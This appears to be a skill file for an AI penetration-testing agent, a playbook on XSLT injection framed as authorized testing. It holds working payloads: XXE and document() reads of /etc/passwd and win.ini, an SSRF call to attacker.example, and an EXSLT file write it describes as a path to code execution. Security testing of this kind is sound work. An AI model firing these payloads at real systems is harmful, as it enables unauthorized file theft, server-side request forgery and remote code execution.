---
name: xslt-injection
description: >-
  XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
---

# SKILL: XSLT Injection — Testing Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: XSLT injection occurs when **attacker-influenced XSLT** is compiled/executed server-side. Map the **processor family** first (Java/.NET/PHP/libxslt). Then chain **document()**, **external entities**, **EXSLT**, or **embedded script/extension functions** per platform. **Authorized testing only**; many payloads are destructive. Routing note: if input is generic XML parsing and may not flow through XSLT, route to `xxe-xml-external-entity`; if you care about outbound `document(http:...)` requests, route to `ssrf-server-side-request-forgery`.

---

## 0. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§1).
4. **Escalate** by family: **document()** / **XXE** (§2–3), **EXSLT write** (§4), **PHP** (§5), **Java** (§6), **.NET** (§7).

**Quick probe** (harmless marker):

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. VENDOR DETECTION

Use standard **system-property** reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Typical fingerprints** (examples, not exhaustive):

| Signal | Possible engine |
|--------|------------------|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon |
| `libxslt` / GNOME stack | libxslt (C, often via PHP, nginx modules, etc.) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

Use results to select §5–§7 paths.

---

## 2. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows **DTD-based entities** in the stylesheet or source when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors (see §3).

---

## 3. FILE READ VIA `document()`

`document()` loads another XML document into a node-set; local files often parse as XML (noisy) but **errors and partial reads** may still leak.

**Unix example**:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows example**:

```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band**:

```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with **error-based** or **timing** observations if inline data does not return to the client.

---

## 4. FILE WRITE VIA EXSLT (`exslt:document`)

When **EXSLT common** extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often **RCE** via webroot, cron paths, or inclusion points.

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. RCE VIA PHP (`php:function`)
- 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)
- 7. RCE VIA .NET (`msxsl:script`)
- 8. DECISION TREE
- Payloads All The Things (PAT) Note
- Tooling (practical)
- Related
